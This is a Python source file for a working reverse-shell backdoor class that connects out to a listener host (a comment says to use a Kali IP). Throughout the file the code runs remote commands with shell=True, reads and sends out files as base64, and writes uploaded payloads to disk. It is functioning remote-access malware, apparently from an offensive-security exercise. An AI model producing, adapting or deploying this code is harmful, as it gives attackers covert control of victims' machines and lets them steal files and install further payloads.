import os
import socket
import json
import subprocess
import base64

# Enable TEST_MODE during unit tests (Set this in your test script)
TEST_MODE = os.getenv("TEST_MODE", "False") == "True"

class SecureBackdoor:
    def __init__(self, ip, port):
        """Initialize the backdoor and connect to the listener."""
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.connect((ip, port))
            if not TEST_MODE:  # ✅ Authentication only when not in test mode
                self.authenticate()
        except ConnectionRefusedError:
            print("[-] Unable to connect to the listener. Ensure the listener is running.")
            exit()

    def authenticate(self):
        """Authenticate with the listener (Disabled in TEST_MODE)."""
        auth_request = self.connection.recv(1024).decode()

        if auth_request == "AUTH_REQ":
            self.connection.send("SECRET_KEY".encode())
            response = self.connection.recv(1024).decode()

            if response == "AUTH_SUCCESS":
                return True  # ✅ Authentication successful
            else:
                raise RuntimeError("Authentication failed")  # ✅ Only raise if real failure

        raise RuntimeError("Authentication failed")  # ✅ Ensure exception is only raised when actually failing

    def reliable_send(self, data):
        """Send data securely using JSON encoding."""
        try:
            json_data = json.dumps(data)
            self.connection.sendall(json_data.encode())
        except Exception as e:
            print(f"[-] Error sending data: {e}")

    def reliable_receive(self):
        """Receive data securely using JSON decoding."""
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    raise ConnectionError("[-] Connection closed by the server.")
                json_data += chunk
                return json.loads(json_data.decode())
            except ValueError:
                continue
            except ConnectionError as e:
                print(f"[!] {e}")
                self.connection.close()
                break

    def execute_command(self, command):
        """Execute system commands and return the output."""
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode().strip()
        except subprocess.CalledProcessError as e:
            return f"[-] Command failed: {e.output.decode()}"

    def change_directory(self, path):
        """Change working directory."""
        try:
            os.chdir(path)
            return f"[+] Changed directory to {path}"
        except FileNotFoundError:
            return f"[-] Directory not found: {path}"

    def write_file(self, path, content):
        """Write uploaded file to disk."""
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] File uploaded successfully."
        except Exception as e:
            return f"[-] File upload failed: {str(e)}"

    def read_file(self, path):
        """Read file content for download."""
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return f"[-] File not found: {path}"

    def run(self):
        """Main execution loop for the backdoor."""
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    break
                elif command[0] == "cd":
                    result = self.change_directory(command[1])
                elif command[0] == "download":
                    result = self.read_file(command[1])
                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_command(command)

                self.reliable_send(result)
            except Exception as e:
                self.connection.close()
                break


if __name__ == "__main__":
    backdoor = SecureBackdoor("192.168.1.73", 5555)  # Replace with your Kali IP
    backdoor.run()
